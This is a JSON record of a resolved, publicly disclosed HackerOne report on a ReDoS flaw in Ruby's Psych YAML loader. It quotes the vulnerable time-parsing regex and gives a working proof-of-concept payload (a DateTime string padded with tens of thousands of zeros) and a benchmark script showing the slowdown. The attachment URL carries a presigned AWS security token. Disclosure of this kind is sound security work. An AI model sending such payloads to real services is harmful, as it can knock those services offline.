@@ -1,0 +1,124 @@
+{
+  "id": 1487889,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg3ODg5",
+  "url": "https://hackerone.com/reports/1487889",
+  "title": "ReDoS in Psych",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-21T22:05:29.100Z",
+  "submitted_at": "2022-02-21T22:05:29.122Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-07-08T22:56:51.867Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-08T22:56:48.578Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found a pattern that occur ReDoS in `Psych.load`.\n\nhttps://github.com/ruby/psych/blob/v4.0.3/lib/psych/scalar_scanner.rb#L113\nhttps://github.com/ruby/psych/blob/v4.0.3/lib/psych/visitors/to_ruby.rb#L83\n\n```ruby\n    def parse_time string\n      klass = class_loader.load 'Time'\n\n      date, time = *(string.split(/[ tT]/, 2))\n      (yy, m, dd) = date.match(/^(-?\\d{4})-(\\d{1,2})-(\\d{1,2})/).captures.map { |x| x.to_i }\n      md = time.match(/(\\d+:\\d+:\\d+)(?:\\.(\\d*))?\\s*(Z|[-+]\\d+(:\\d\\d)?)?/)\n\n      (hh, mm, ss) = md[1].split(':').map { |x| x.to_i }\n      us = (md[2] ? Rational(\"0.#{md[2]}\") : 0) * 1000000\n```                 \n\n`/(\\d+:\\d+:\\d+)(?:\\.(\\d*))?\\s*(Z|[-+]\\d+(:\\d\\d)?)?/` is vulnerable.\n\nIt is a detect result by `recheck` ( https://makenowjust-labs.github.io/recheck/ ).\n\n{F1627996}\n\n## PoC\n\n```ruby\n❯ ruby -v\nruby 3.1.1p18 (2022-02-18 revision 53f5fc4236) [arm64-darwin20]\n\n❯ irb\nirb(main):001:0> require 'yaml'\n=> true\nirb(main):002:0> require 'date'\n=> true\n\nirb(main):003:0> YAML.dump(DateTime.now)\n=> \"--- !ruby/object:DateTime 2022-02-22 06:43:52.577591000 +09:00\\n\"\n\nirb(main):004:0> YAML.load(\"--- !ruby/object:DateTime 2022-02-22 07:02:07.096315000 +09:00\\n\", permitted_classes: [Time, DateTime])\n=> #<DateTime: 2022-02-22T07:02:07+09:00 ((2459632j,79327s,96315000n),+32400s,2299161j)>\n\nirb(main):005:0> YAML.load(\"--- !ruby/object:DateTime 2022-02-22 \" + '0' * 50000 + \"00:0Z0:0:0\", permitted_classes: [Time, DateTime])\n# ReDoS!\n=> #<DateTime: 2022-02-22T09:00:00+09:00 ((2459633j,0s,0n),+32400s,2299161j)>\n```\n\n## benchmark\n\ndatetime_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'yaml'\nrequire 'date'\n  \ndef datetime_parse(length)\n  text = \"--- !ruby/object:DateTime 2022-02-21 \" + '0' * length + '00:0Z0:0:0'\n  YAML.load(text , permitted_classes: [Time, DateTime])\nend\n\nBenchmark.bm do |x|\n  x.report { datetime_parse(100) }\n  x.report { datetime_parse(1000) }\n  x.report { datetime_parse(10000) }\n  x.report { datetime_parse(100000) }\nend\n```\n\n```\n❯ ruby datetime_benchmark.rb\n       user     system      total        real\n   0.000215   0.000212   0.000427 (  0.000422)\n   0.002306   0.000005   0.002311 (  0.002314)\n   0.219717   0.000125   0.219842 (  0.219844)\n  21.904961   0.041427  21.946388 ( 21.946604)\n```\n\n## Impact\n\nReDoS occurs when `DateTime` deserialization is allowed.\n\nThe impact is limited as the attack string never matches the value of `TIME`.(https://github.com/ruby/psych/blob/v4.0.3/lib/psych/scalar_scanner.rb#L50\n)",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1627996,
+      "file_name": "recheck_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ku87jvp0kep94omqjf1jpn1ei2up?response-content-disposition=attachment%3B%20filename%3D%22recheck_1.png%22%3B%20filename%2A%3DUTF-8%27%27recheck_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRGLGVFY%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T200058Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCfLlDFG2q2gON9U2InKOX70IIJEipFnshVB9AURT3itQIhAJ0TzHeg4rx%2BmL81OfKftiaITDhIznDtYoNmxRqoxKHSKrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8e4gK3c1aOJt5J%2BkqjwUXzbsHxNy9lG126gfTZlXYm5oF5NDmCDwVMP6Ago0C2pha5zPbYwp9hAB%2BJscd8cu8lA%2BRn55ATbIy4bMDSKkU%2FltgPttx9GIdlQSGKckW9aDR4B%2Bnu0mSn2vuoIJyeMjdgNER0DGdBhvsD57by%2BN2bMe7EzT0tDZze8%2Ffq29t1pv4EbnASwscPecuM1jZzsJs7Ew0cxmJvnSxbPkHEVTFTVhXhXvPcbhT%2FjHONyk%2BPkdF4zbN2j0RPji5NjGuaFlvshtzGcpmyTh9OiReyMiOT4g33Mv4MWwB%2BRKaPhcGyH63%2Bz5niNyqA7RiPy0pclyjFj3ui7yICKtdJ%2F%2FvfI7GuDCug685unb14NDP7XSXww%2BprA7GMqnNoMjrslbKvWGjPwOqN08fqPEjntf0E2v5CfOTpin9H8CmNcedc4%2BfYv85g%2FwujDL1y67Foavql5ADnPFZJMSdVUCG9V8AY9FRxMn6TR%2BlOlwIjqWn3IsxIaDoEyLKty284BEIG1U0oLS7iHTDDKizhlAZRbGoAUva%2BLmzbQqHdg4EllU9k7v%2FrI7HBgUR5QJUYwis%2Bnp0uSBzsTJGw2h1RP0kcDx2tFUoIUbZFlK%2F%2B8jNbhULDZFbkRq4uLvs0dZ8Og%2B39yU1CSA2wkyO%2F85aMzmHd9YBfr2oMsWun9FVGHRiicObSSBSIfftRFKGgEJEkZxU1OzBKMqJJFAPZgY5zQVsseJl7BwaoWPQWy204qbodVe%2F7Qv%2Fnf37YOc3jqmLKh94zzoJ4%2BmzX7Ifx0Ir3D0DExtahV6rs%2BBOIXxzsLsdIJkFR%2BbAgJq1JTDlOqPeeuTsW9aET%2BaEV3XNmfs0nDI6iR67%2BvlLCSVrLP%2BPTEE37NsSkjDqMK%2FH4swGOrAB8KREP1yc88Eg1T4isVwEc%2F6%2BPgBvXICV2axr%2B189UoTMB6PDmkQqv%2FXjWX%2ByQeGyft2KYnWIoVvMaSFLVaiCjKl5T4DhIE%2FddbQGDapU4gyOU6Prn3uUQzazS9d7CXAna3Jfw9VBrCIoe9C4TIRTP7XVvBYHrBoOpM%2BHJm0vjwzS5a7lfuWOdr0Dv2o3UWQ%2FdagaQCswU2q1EsUgp1PKNJtY5%2FAvSF4qMBM0fzJemGo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b57fe2bacee2490eea7a00a70798e3e7c95ff42dbd25aa83d0d9e79cae1b672c",
+      "file_size": 306357,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-07-08T22:56:48.725Z",
+  "allow_singular_disclosure_after": -19602249.3559654,
+  "singular_disclosure_allowed": true,
+  "vote_count": 26,
+  "voters": [
+    "zy9ard3",
+    "mohaned0101",
+    "thalaivar304",
+    "ahmed_xyz",
+    "2026",
+    "0xm394tr0n",
+    "cynsys",
+    "hunter350",
+    "zephyr31337",
+    "dimikarl2022",
+    "and 16 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
